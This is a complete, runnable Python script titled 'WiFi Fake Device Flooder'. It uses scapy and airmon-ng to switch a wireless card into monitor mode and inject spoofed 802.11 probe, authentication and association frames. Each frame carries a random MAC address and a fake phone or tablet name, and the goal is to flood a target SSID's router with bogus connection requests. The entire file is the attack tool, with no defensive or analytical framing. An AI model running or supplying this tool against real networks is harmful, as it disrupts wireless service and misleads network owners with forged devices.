#!/usr/bin/env python3
import subprocess
import time
import random
import sys
import os
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, RadioTap

# Common device names
DEVICE_NAMES = [
    "Samsung-Galaxy", "Motorola-Edge", "iPhone-13", "Xiaomi-Redmi", 
    "Huawei-P30", "OnePlus-9", "Google-Pixel", "OPPO-Find",
    "Sony-Xperia", "LG-Velvet", "Nokia-8", "iPad-Pro",
    "Galaxy-Tab", "Surface-Pro", "Kindle-Fire", "Echo-Dot"
]

def check_interface(interface):
    """Check if the wireless interface exists"""
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        if interface in result.stdout:
            return True
        print(f"Interface {interface} not found. Available wireless interfaces:")
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                print(f"  {line.split(':')[0]}")
        return False
    except:
        print("Error checking wireless interfaces")
        return False

def enable_monitor_mode(interface):
    """Enable monitor mode on the wireless interface"""
    try:
        # Kill conflicting processes
        subprocess.run(['airmon-ng', 'check', 'kill'], check=True, 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Start monitor mode
        subprocess.run(['airmon-ng', 'start', interface], check=True)
        mon_interface = interface + 'mon'
        print(f"Monitor mode enabled on {mon_interface}")
        return mon_interface
    except:
        print("Failed to enable monitor mode with airmon-ng, trying manual method...")
        try:
            # Manual method
            subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
            subprocess.run(['iwconfig', interface, 'mode', 'monitor'], check=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
            print(f"Monitor mode enabled on {interface}")
            return interface
        except:
            print("Failed to enable monitor mode")
            return None

def disable_monitor_mode(mon_interface, original_interface):
    """Disable monitor mode"""
    try:
        if mon_interface.endswith('mon'):
            subprocess.run(['airmon-ng', 'stop', mon_interface], check=True)
        else:
            subprocess.run(['ip', 'link', 'set', mon_interface, 'down'], check=True)
            subprocess.run(['iwconfig', mon_interface, 'mode', 'managed'], check=True)
            subprocess.run(['ip', 'link', 'set', mon_interface, 'up'], check=True)
        print("Monitor mode disabled")
    except:
        print("Warning: Could not disable monitor mode")

def generate_random_mac():
    """Generate a random MAC address"""
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def create_fake_device(interface, ssid, device_num):
    """Create a single fake device"""
    fake_mac = generate_random_mac()
    device_name = random.choice(DEVICE_NAMES) + str(random.randint(1, 99))
    
    print(f"Creating fake device {device_num}: {device_name} ({fake_mac})")
    
    try:
        # Create and send probe request
        probe_req = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', 
                                    addr2=fake_mac, 
                                    addr3='ff:ff:ff:ff:ff:ff')/Dot11ProbeReq()/Dot11Elt(ID='SSID', info=ssid)
        sendp(probe_req, iface=interface, verbose=0)
        
        # Create and send authentication request
        auth_req = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', 
                                   addr2=fake_mac, 
                                   addr3='ff:ff:ff:ff:ff:ff')/Dot11Auth(seqnum=1)
        sendp(auth_req, iface=interface, verbose=0)
        
        # Create and send association request
        asso_req = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', 
                                   addr2=fake_mac, 
                                   addr3='ff:ff:ff:ff:ff:ff')/Dot11AssoReq()/Dot11Elt(ID='SSID', info=ssid)
        sendp(asso_req, iface=interface, verbose=0)
        
        return True
    except Exception as e:
        print(f"Error creating device {device_num}: {e}")
        return False

def main():
    print("WiFi Fake Device Flooder")
    print("========================")
    
    # Get wireless interface
    if len(sys.argv) < 2:
        print("Usage: python3 wifi_flooder.py <interface> [ssid] [num_devices]")
        print("Example: python3 wifi_flooder.py wlan0 MyNetwork 50")
        return
    
    interface = sys.argv[1]
    ssid = sys.argv[2] if len(sys.argv) > 2 else input("Enter WiFi SSID: ")
    num_devices = int(sys.argv[3]) if len(sys.argv) > 3 else 20
    
    # Check if interface exists
    if not check_interface(interface):
        return
    
    # Enable monitor mode
    mon_interface = enable_monitor_mode(interface)
    if not mon_interface:
        return
    
    try:
        print(f"\nStarting to create {num_devices} fake devices for network: {ssid}")
        print("This will make devices appear as connection requests in your router/admin panel\n")
        
        successful = 0
        for i in range(1, num_devices + 1):
            if create_fake_device(mon_interface, ssid, i):
                successful += 1
            time.sleep(0.2)  # Small delay between devices
        
        print(f"\nSuccessfully created {successful}/{num_devices} fake devices")
        print("Check your router's admin panel or TP-Link Tether app to see the pending connection requests")
        print("\nPress Ctrl+C to stop monitor mode")
        
        # Keep monitor mode running
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nStopping...")
    finally:
        # Restore interface to managed mode
        disable_monitor_mode(mon_interface, interface)

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print("This script requires root privileges. Please run with sudo.")
        sys.exit(1)
    
    main()
